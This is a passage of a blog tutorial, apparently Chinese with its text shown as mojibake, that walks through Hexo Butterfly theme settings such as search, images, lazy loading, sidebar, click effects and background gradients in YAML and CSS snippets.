class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  enable: false</span><br><span class="line">  line_number: false</span><br><span class="line">  auto_detect: false</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731319.png" alt="image-20240409173121285"> </p><h1 id="æœ¬åœ°æœç´¢åŠŸèƒ½"><a href="#æœ¬åœ°æœç´¢åŠŸèƒ½" class="headerlink" title="æœ¬åœ°æœç´¢åŠŸèƒ½"></a>æœ¬åœ°æœç´¢åŠŸèƒ½</h1><p>å¦‚æœè¦ä½¿ç”¨æœ¬åœ°æœç´¢åŠŸèƒ½ï¼Œéœ€è¦å®‰è£… hexo-generator-search æ’ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹_config.butterfly.yml é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#x27;t find any results for the search: $&#123;query&#125;&quot; # å¦‚æœæ²¡æœ‰æŸ¥åˆ°å†…å®¹ç›¸å…³å†…å®¹æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731709.png" alt="image-20240409173142597">  </p><h1 id="ä¿®æ”¹å‰¯æ ‡é¢˜"><a href="#ä¿®æ”¹å‰¯æ ‡é¢˜" class="headerlink" title="ä¿®æ”¹å‰¯æ ‡é¢˜"></a>ä¿®æ”¹å‰¯æ ‡é¢˜</h1><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ _config.butterfly.yml:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># the subtitle on homepage (ä¸»é subtitle)</span><br><span class="line">subtitle:</span><br><span class="line">  enable: true</span><br><span class="line">  # Typewriter Effect (å¼€å¯æ‰“å­—æ•ˆæœ)</span><br><span class="line">  effect: true</span><br><span class="line">  # loop (å¾ªç’°æ‰“å­—)</span><br><span class="line">  loop: true</span><br><span class="line">  # sourceèª¿ç”¨ç¬¬ä¸‰æ–¹æœå‹™</span><br><span class="line">  # source: false é—œé–‰èª¿ç”¨</span><br><span class="line">  # source: 1  èª¿ç”¨æå¤©apiçš„éš¨æ©ŸèªéŒ„ï¼ˆç°¡é«”ï¼‰</span><br><span class="line">  # source: 2  èª¿ç”¨ä¸€è¨€ç¶²çš„ä¸€å¥è©±ï¼ˆç°¡é«”ï¼‰</span><br><span class="line">  # source: 3  èª¿ç”¨ä¸€å¥ç¶²ï¼ˆç°¡é«”ï¼‰</span><br><span class="line">  # source: 4  èª¿ç”¨ä»Šæ—¥è©©è©ï¼ˆç°¡é«”ï¼‰</span><br><span class="line">  # subtitle æœƒå…ˆé¡¯ç¤º source , å†é¡¯ç¤º sub çš„å…§å®¹</span><br><span class="line">  source: false</span><br><span class="line">  # å¦‚æœæœ‰è‹±æ–‡é€—å·&#x27; , &#x27;,è¯·ä½¿ç”¨è½¬ä¹‰å­—å…ƒ &amp;#44;</span><br><span class="line">  # å¦‚æœæœ‰è‹±æ–‡åŒå¼•å·&#x27; &quot; &#x27;,è¯·ä½¿ç”¨è½¬ä¹‰å­—å…ƒ &amp;quot;</span><br><span class="line">  # å¼€å¤´ä¸å…è¨±è½¬ä¹‰å­—å…ƒï¼Œå¦‚éœ€è¦ï¼Œè¯·æŠŠæ•´å€‹å¥å­ç”¨åŒå¼•å·åŒ…ä½</span><br><span class="line">  # å¦‚æœå…³é—­æ‰“å­—æ•ˆæœï¼Œsubtitleåªä¼šç°ç¤ºsubçš„ç¬¬ä¸€è¡Œæ–‡å­—</span><br><span class="line">  sub:</span><br><span class="line">    - ä»æ¥æ²¡æœ‰çœŸæ­£çš„ç»å¢ƒï¼Œåªæœ‰å¿ƒçµçš„è¿·é€”</span><br><span class="line">    - Never really desperateï¼Œonly the lost of the soul</span><br><span class="line">    - æ²¡æœ‰é€‰æ‹©ä¼šæ˜¯å”¯ä¸€çš„è·¯</span><br><span class="line">    - No choice will be the only way</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091731603.png" alt="image-20240409173155522">   </p><h1 id="å›¾ç‰‡è®¾ç½®"><a href="#å›¾ç‰‡è®¾ç½®" class="headerlink" title="å›¾ç‰‡è®¾ç½®"></a>å›¾ç‰‡è®¾ç½®</h1><p>å›¾ç‰‡å¯ä»¥ç”¨äº‘é“¾æ¥æˆ–è€…æœ¬åœ°è·¯å¾„ï¼š&#x2F;themes&#x2F;butterfly&#x2F;source&#x2F;imgã€‚ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.ymlï¼š</p><h2 id="ç½‘ç«™å›¾æ ‡"><a href="#ç½‘ç«™å›¾æ ‡" class="headerlink" title="ç½‘ç«™å›¾æ ‡"></a>ç½‘ç«™å›¾æ ‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Faviconï¼ˆç½‘ç«™å›¾ï¼‰</span><br><span class="line">favicon: /img/favicon.png</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091732790.png" alt="image-20240409173204664">  </p><h2 id="å¤´åƒ"><a href="#å¤´åƒ" class="headerlink" title="å¤´åƒ"></a>å¤´åƒ</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  img: /img/avatar.jpg #å›¾ç‰‡è·¯å¾„</span><br><span class="line">  effect: false #å¤´åƒä¼šä¸€ç›´è½¬åœˆ  </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091737311.png" alt="image-20240409173712278">  </p><h2 id="ä¸»é¡µå°é¢å›¾ç‰‡"><a href="#ä¸»é¡µå°é¢å›¾ç‰‡" class="headerlink" title="ä¸»é¡µå°é¢å›¾ç‰‡"></a>ä¸»é¡µå°é¢å›¾ç‰‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># The banner image of home page</span><br><span class="line">index_img: /img/background.jpg</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091738768.png" alt="image-20240409173816493">  </p><h2 id="æ–‡ç« è¯¦æƒ…é¡µé¡¶éƒ¨å›¾ç‰‡"><a href="#æ–‡ç« è¯¦æƒ…é¡µé¡¶éƒ¨å›¾ç‰‡" class="headerlink" title="æ–‡ç« è¯¦æƒ…é¡µé¡¶éƒ¨å›¾ç‰‡"></a>æ–‡ç« è¯¦æƒ…é¡µé¡¶éƒ¨å›¾ç‰‡</h2><p>å½“æ²¡æœ‰åœ¨front-matterè®¾ç½®top_imgå’Œcoverçš„æƒ…å†µä¸‹ä¼šæ˜¾ç¤ºè¯¥å›¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If the banner of page not setting, it will show the top_img</span><br><span class="line">default_top_img: /img/default_top_img.jpg </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091739148.png" alt="image-20240409173923951">  </p><h2 id="å½’æ¡£é¡µåº•éƒ¨å›¾ç‰‡"><a href="#å½’æ¡£é¡µåº•éƒ¨å›¾ç‰‡" class="headerlink" title="å½’æ¡£é¡µåº•éƒ¨å›¾ç‰‡"></a>å½’æ¡£é¡µåº•éƒ¨å›¾ç‰‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#å½’æ¡£å­æ ‡ç­¾é¡µå›¾ç‰‡</span><br><span class="line"># The banner image of archive page</span><br><span class="line">archive_img: /img/archive.jpg</span><br></pre></td></tr></table></figure><h2 id="tagé¡µé¡¶éƒ¨å›¾ç‰‡"><a href="#tagé¡µé¡¶éƒ¨å›¾ç‰‡" class="headerlink" title="tagé¡µé¡¶éƒ¨å›¾ç‰‡"></a>tagé¡µé¡¶éƒ¨å›¾ç‰‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#tagé¡µï¼ˆæ ‡ç­¾é¡µï¼‰</span><br><span class="line">tag_img: /img/tag_img.jpg</span><br></pre></td></tr></table></figure><h2 id="categoryé¡µé¡¶éƒ¨å›¾ç‰‡"><a href="#categoryé¡µé¡¶éƒ¨å›¾ç‰‡" class="headerlink" title="categoryé¡µé¡¶éƒ¨å›¾ç‰‡"></a>categoryé¡µé¡¶éƒ¨å›¾ç‰‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#categoryé¡µ</span><br><span class="line">category_img: /img/category_img.jpg</span><br></pre></td></tr></table></figure><h2 id="ç»Ÿä¸€æ–‡ç« å°é¢"><a href="#ç»Ÿä¸€æ–‡ç« å°é¢" class="headerlink" title="ç»Ÿä¸€æ–‡ç« å°é¢"></a>ç»Ÿä¸€æ–‡ç« å°é¢</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cover:</span><br><span class="line">  index_enable: true #  æ˜¯å¦å±•ç¤ºæ–‡ç« å°é¢</span><br><span class="line">  aside_enable: true</span><br><span class="line">  archives_enable: true</span><br><span class="line">  position: both # å°é¢å±•ç¤ºçš„ä½ç½® left/right/both</span><br><span class="line">  # å½“æ²¡æœ‰è®¾ç½®coveræ—¶ï¼Œé»˜è®¤å±•ç¤ºçš„æ–‡ç« å°é¢</span><br><span class="line">  default_cover:</span><br><span class="line">    # å½“é…ç½®å¤šå¼ å›¾ç‰‡æ—¶ï¼Œä¼šéšæœºé€‰æ‹©ä¸€å¼ ä½œä¸º cover. æ­¤æ—¶å†™æ³•ä¸º</span><br><span class="line">    - https:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br></pre></td></tr></table></figure><p>å¦‚æœéœ€è¦ä¸ºæ¯ä¸€ç¯‡æ–‡ç« è®¾ç½®ä¸åŒçš„å°é¢ï¼Œå¯ä»¥åœ¨æ–‡ç« çš„mdæ–‡ä»¶ä¸­æ·»åŠ é…ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World        # æ ‡é¢˜</span><br><span class="line">tags: [hello]             # æ ‡ç­¾</span><br><span class="line">categories:               # åˆ†ç±»</span><br><span class="line">description: hello word~  # æè¿°</span><br><span class="line">top_img: /img/hello-1.png # é¡¶éƒ¨èƒŒæ™¯å›¾</span><br><span class="line">cover: /img/hello-1.png   # æ–‡ç« å°é¢</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091739478.png" alt="image-20240409173949425">  </p><h2 id="é”™è¯¯é¡µé¢"><a href="#é”™è¯¯é¡µé¢" class="headerlink" title="é”™è¯¯é¡µé¢"></a>é”™è¯¯é¡µé¢</h2><p>é…ç½®äº†è¯¥å±æ€§åä¼šæ›¿æ¢æ— æ³•å±•ç¤ºçš„å›¾ç‰‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Replace Broken Images (æ›¿æ›ç„¡æ³•é¡¯ç¤ºçš„åœ–ç‰‡)</span><br><span class="line">error_img:</span><br><span class="line">  flink: /img/friend_404.gif</span><br><span class="line">  post_page: /img/404.jpg</span><br></pre></td></tr></table></figure><h1 id="å›¾ç‰‡æ‡’åŠ è½½"><a href="#å›¾ç‰‡æ‡’åŠ è½½" class="headerlink" title="å›¾ç‰‡æ‡’åŠ è½½"></a>å›¾ç‰‡æ‡’åŠ è½½</h1><p>æ–°å¢hexo-lazyload-imageæ¨¡å—</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">npm install hexo-lazyload-image --save</span><br></pre></td></tr></table></figure><p>åœ¨ä¸»ç›®å½•é…ç½®æ–‡ä»¶_config.ymlå¢åŠ é…ç½®</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  loadingImg: /img/loading.gif</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ˜¯å›¾ç‰‡æ²¡åŠ è½½å‡ºæ¥çš„æ—¶å€™ï¼Œå‡ºç°ä¸€ä¸ªåŠ¨å›¾è½¬è½¬è½¬çš„æ–‡ç« é¡µæ ·å¼ </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740516.png" alt="image-20240409174005478">  </p><h1 id="å›¾ç‰‡æ”¾å¤§æŸ¥çœ‹"><a href="#å›¾ç‰‡æ”¾å¤§æŸ¥çœ‹" class="headerlink" title="å›¾ç‰‡æ”¾å¤§æŸ¥çœ‹"></a>å›¾ç‰‡æ”¾å¤§æŸ¥çœ‹</h1><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">medium_zoom: <span class="literal">false</span></span><br><span class="line">fancybox: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h1 id="ç‰ˆæƒæ ·å¼"><a href="#ç‰ˆæƒæ ·å¼" class="headerlink" title="ç‰ˆæƒæ ·å¼"></a>ç‰ˆæƒæ ·å¼</h1><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.yml</p><p>å¤åˆ¶çš„å†…å®¹åé¢åŠ ä¸Šç‰ˆæƒä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (è¤‡è£½çš„å…§å®¹å¾Œé¢åŠ ä¸Šç‰ˆæ¬Šä¿¡æ¯)</span><br><span class="line">copy:</span><br><span class="line">  enable: true # æ˜¯å¦å¼€å¯ç½‘ç«™å¤åˆ¶æƒé™</span><br><span class="line">  copyright:  # å¤åˆ¶çš„å†…å®¹åé¢åŠ ä¸Šç‰ˆæƒä¿¡æ¯</span><br><span class="line">    enable: false  # æ˜¯å¦å¼€å¯å¤åˆ¶ç‰ˆæƒä¿¡æ¯æ·»åŠ </span><br><span class="line">    limit_count: 50 # å­—æ•°é™åˆ¶ï¼Œå½“å¤åˆ¶æ–‡å­—å¤§äºè¿™ä¸ªå­—æ•°é™åˆ¶æ—¶</span><br></pre></td></tr></table></figure><p>æ–‡ç« ç‰ˆæƒä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  decode: true</span><br><span class="line">  license: CC BY-NC-SA 4.0</span><br><span class="line">  license_url: https://creativecommons.org/licenses/by-nc-sa/4.0/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740536.png" alt="image-20240409174018503">  </p><h1 id="ä¾§è¾¹æ æ ·å¼"><a href="#ä¾§è¾¹æ æ ·å¼" class="headerlink" title="ä¾§è¾¹æ æ ·å¼"></a>ä¾§è¾¹æ æ ·å¼</h1><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.yml</p><p>è°ƒæ•´ä¾§è¾¹æ å‡ºç°ä½ç½®</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">aside:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  hide: <span class="literal">false</span></span><br><span class="line">  button: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">true</span> # display on mobile</span><br><span class="line">  position: right # left or right </span><br></pre></td></tr></table></figure><p>ä¸ªäººä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">social:</span><br><span class="line">   fab fa-github: https:<span class="comment">//github.com/ || Github</span></span><br><span class="line">   fa fa-book-open: https:<span class="comment">//blog.csdn.net/mjh1667002013 || CSDN</span></span><br><span class="line">   fab fa-qq:  tencent:<span class="comment">//AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=728831102&amp;website=www.oicqzone.com || QQ</span></span><br><span class="line">   fas fa-envelope-open-text: mailto:<span class="number">1976083684</span><span class="meta">@qq</span>.com || Email</span><br></pre></td></tr></table></figure><h1 id="å…¬å‘Šæ è®¾ç½®"><a href="#å…¬å‘Šæ è®¾ç½®" class="headerlink" title="å…¬å‘Šæ è®¾ç½®"></a>å…¬å‘Šæ è®¾ç½®</h1><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">card_announcement:</span><br><span class="line">    enable: <span class="literal">true</span></span><br><span class="line">    content: This is my Blog #ä¿®æ”¹å…¬å‘Šæ ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740662.png" alt="image-20240409174030633">  </p><h1 id="TOCç›®å½•"><a href="#TOCç›®å½•" class="headerlink" title="TOCç›®å½•"></a>TOCç›®å½•</h1><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.yml</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># toc (ç›®éŒ„)</span><br><span class="line">toc:</span><br><span class="line">  post: <span class="literal">true</span></span><br><span class="line">  page: <span class="literal">false</span></span><br><span class="line">  number: <span class="literal">false</span></span><br><span class="line">  expand: <span class="literal">true</span> # æ˜¯å¦å±•å¼€</span><br><span class="line">  style_simple: <span class="literal">false</span> # <span class="keyword">for</span> post</span><br><span class="line">  scroll_percent: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740966.png" alt="image-20240409174038930">  </p><h1 id="èƒŒæ™¯ç¾åŒ–"><a href="#èƒŒæ™¯ç¾åŒ–" class="headerlink" title="èƒŒæ™¯ç¾åŒ–"></a>èƒŒæ™¯ç¾åŒ–</h1><p>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ _config.butterfly.yml</p><h2 id="é¼ æ ‡ç‚¹å‡»æ•ˆæœ"><a href="#é¼ æ ‡ç‚¹å‡»æ•ˆæœ" class="headerlink" title="é¼ æ ‡ç‚¹å‡»æ•ˆæœ"></a>é¼ æ ‡ç‚¹å‡»æ•ˆæœ</h2><p>æœ‰å†’å…‰ç‰¹æ•ˆã€çƒŸç«ç‰¹æ•ˆã€çˆ±å¿ƒç‰¹æ•ˆã€æ–‡å­—ç‰¹æ•ˆï¼Œé€‰æ‹©å…¶ä¸­ä¸€ä¸ªå°†enableè®¾ç½®ä¸ºtrueå°±å¯ä»¥ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Typewriter <span class="title function_">Effect</span> <span class="params">(æ‰“å­—æ•ˆæœ)</span></span><br><span class="line"># https:<span class="comment">//github.com/disjukr/activate-power-mode</span></span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  colorful: <span class="literal">true</span> # open particle <span class="title function_">animation</span> <span class="params">(å†’å…‰ç‰¹æ•ˆ)</span></span><br><span class="line">  shake: <span class="literal">true</span> #  open <span class="title function_">shake</span> <span class="params">(æŠ–åŠ¨ç‰¹æ•ˆ)</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: fireworks (é¼ æ ‡ç‚¹å‡»æ•ˆæœ:è¤ç«ç‰¹æ•ˆ)</span><br><span class="line">fireworks:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  zIndex: <span class="number">9999</span> # -<span class="number">1</span> or <span class="number">9999</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: Heart <span class="title function_">symbol</span> <span class="params">(é¼ æ ‡ç‚¹å‡»æ•ˆæœ: çˆ±å¿ƒ)</span></span><br><span class="line">click_heart:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"># Mouse click effects: words (é¼ æ ‡ç‚¹å‡»æ•ˆæœ: æ–‡å­—)</span><br><span class="line">ClickShowText:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  text:</span><br><span class="line">     - å¯Œå¼º</span><br><span class="line">     - æ°‘ä¸»</span><br><span class="line">     - æ–‡æ˜</span><br><span class="line">     - å’Œè°</span><br><span class="line">     - å¹³ç­‰</span><br><span class="line">     - å…¬æ­£</span><br><span class="line">     - æ³•æ²»</span><br><span class="line">     - çˆ±å›½</span><br><span class="line">     - æ•¬ä¸š</span><br><span class="line">     - è¯šä¿¡</span><br><span class="line">     - å‹å–„</span><br><span class="line">  fontSize: 15px</span><br><span class="line">  random: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404091740263.png" alt="image-20240409174048213">   </p><h2 id="æ‰“å­—æ•ˆæœ"><a href="#æ‰“å­—æ•ˆæœ" class="headerlink" title="æ‰“å­—æ•ˆæœ"></a>æ‰“å­—æ•ˆæœ</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Typewriter <span class="title function_">Effect</span> <span class="params">(æ‰“å­—æ•ˆæœ)</span></span><br><span class="line"># https:<span class="comment">//github.com/disjukr/activate-power-mode</span></span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  colorful: <span class="literal">true</span> # open particle <span class="title function_">animation</span> <span class="params">(å†’å…‰ç‰¹æ•ˆ)</span></span><br><span class="line">  shake: <span class="literal">true</span> #  open <span class="title function_">shake</span> <span class="params">(æŠ–åŠ¨ç‰¹æ•ˆ)</span></span><br><span class="line">  mobile: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="èƒŒæ™¯ç‰¹æ•ˆ"><a href="#èƒŒæ™¯ç‰¹æ•ˆ" class="headerlink" title="èƒŒæ™¯ç‰¹æ•ˆ"></a>èƒŒæ™¯ç‰¹æ•ˆ</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Background <span class="title function_">effects</span> <span class="params">(èƒŒæ™¯ç‰¹æ•ˆ)</span></span><br><span class="line"># canvas_ribbon (é™æ­¢å½©å¸¦)</span><br><span class="line"># See: https:<span class="comment">//github.com/hustcc/ribbon.js</span></span><br><span class="line">canvas_ribbon:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  size: <span class="number">150</span></span><br><span class="line">  alpha: <span class="number">0.6</span></span><br><span class="line">  zIndex: -<span class="number">1</span></span><br><span class="line">  click_to_change: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line"># Fluttering <span class="title function_">Ribbon</span> <span class="params">(åŠ¨æ€å½©å¸¦)</span></span><br><span class="line">canvas_fluttering_ribbon:</span><br><span class="line">  enable: <span class="literal">false</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br><span class="line">#æ˜Ÿç©ºç‰¹æ•ˆ</span><br><span class="line"># canvas_nest</span><br><span class="line"># https:<span class="comment">//github.com/hustcc/canvas-nest.js</span></span><br><span class="line">canvas_nest:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  color: <span class="string">&#x27;0,0,255&#x27;</span> #color of lines, <span class="keyword">default</span>: <span class="string">&#x27;0,0,0&#x27;</span>; RGB values: (R,G,B).(note: use <span class="string">&#x27;,&#x27;</span> to separate.)</span><br><span class="line">  opacity: <span class="number">0.7</span> # the opacity of <span class="title function_">line</span> <span class="params">(<span class="number">0</span>~<span class="number">1</span>)</span>, <span class="keyword">default</span>: <span class="number">0.5</span>.</span><br><span class="line">  zIndex: -<span class="number">1</span> # z-index property of the background, <span class="keyword">default</span>: -<span class="number">1.</span></span><br><span class="line">  count: <span class="number">99</span> # the number of lines, <span class="keyword">default</span>: <span class="number">99.</span></span><br><span class="line">  mobile: <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰èƒŒæ™¯ä¸»é¢˜è‰²"><a href="#è‡ªå®šä¹‰èƒŒæ™¯ä¸»é¢˜è‰²" class="headerlink" title="è‡ªå®šä¹‰èƒŒæ™¯ä¸»é¢˜è‰²"></a>è‡ªå®šä¹‰èƒŒæ™¯ä¸»é¢˜è‰²</h2><p>å¯ä»¥ä¿®æ”¹éƒ¨åˆ†çš„UIé¢œè‰²ï¼Œæ²¡æµ‹è¯•è¿‡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># theme_color:</span><br><span class="line">#   enable: <span class="literal">true</span></span><br><span class="line">#   main: <span class="string">&quot;#49B1F5&quot;</span></span><br><span class="line">#   paginator: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   button_hover: <span class="string">&quot;#FF7242&quot;</span></span><br><span class="line">#   text_selection: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   link_color: <span class="string">&quot;#99a9bf&quot;</span></span><br><span class="line">#   meta_color: <span class="string">&quot;#858585&quot;</span></span><br><span class="line">#   hr_color: <span class="string">&quot;#A4D8FA&quot;</span></span><br><span class="line">#   code_foreground: <span class="string">&quot;#F47466&quot;</span></span><br><span class="line">#   code_background: <span class="string">&quot;rgba(27, 31, 35, .05)&quot;</span></span><br><span class="line">#   toc_color: <span class="string">&quot;#00c4b6&quot;</span></span><br><span class="line">#   blockquote_padding_color: <span class="string">&quot;#49b1f5&quot;</span></span><br><span class="line">#   blockquote_background_color: <span class="string">&quot;#49b1f5&quot;</span></span><br></pre></td></tr></table></figure><h2 id="æ¸å˜èƒŒæ™¯"><a href="#æ¸å˜èƒŒæ™¯" class="headerlink" title="æ¸å˜èƒŒæ™¯"></a>æ¸å˜èƒŒæ™¯</h2><p>é»˜è®¤æ˜¾ç¤ºç™½è‰²ï¼Œå¯è®¾ç½®å›¾ç‰‡æˆ–è€…é¢œè‰²<br>ä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.ymlï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">background:</span><br></pre></td></tr></table></figure><p>è®¾ç½®æ¸å˜è‰²æ­¥éª¤ï¼š</p><ol><li>åœ¨\Butterfly\source\css\ç›®å½•ä¸‹åˆ›å»ºcssæ–‡ä»¶ background.cssï¼š</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#web_bg &#123;</span><br><span class="line">  background: -webkit-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -moz-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    rgba(<span class="number">80</span>, <span class="number">115</span>, <span class="number">184</span>, <span class="number">0.1</span>) <span class="number">58</span>%,</span><br><span class="line">    rgba(<span class="number">16</span>, <span class="number">152</span>, <span class="number">173</span>, <span class="number">0.1</span>) <span class="number">72</span>%,</span><br><span class="line">    rgba(<span class="number">7</span>, <span class="number">179</span>, <span class="number">155</span>, <span class="number">0.1</span>) <span class="number">86</span>%,</span><br><span class="line">    rgba(<span class="number">109</span>, <span class="number">186</span>, <span class="number">130</span>, <span class="number">0.1</span>) <span class="number">100</span>%</span><br><span class="line">  );</span><br><span class="line">  background: -o-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(<span class="number">247</span>, <span class="number">149</span>, <span class="number">51</span>, <span class="number">0.1</span>) <span class="number">0</span>,</span><br><span class="line">    rgba(<span class="number">243</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">0.1</span>) <span class="number">15</span>%,</span><br><span class="line">    rgba(<span class="number">239</span>, <span class="number">78</span>, <span class="number">123</span>, <span class="number">0.1</span>) <span class="number">30</span>%,</span><br><span class="line">    rgba(<span class="number">161</span>, <span class="number">102</span>, <span class="number">171</span>, <span class="number">0.1</span>) <span class="number">44</span>%,</span><br><span class="line">    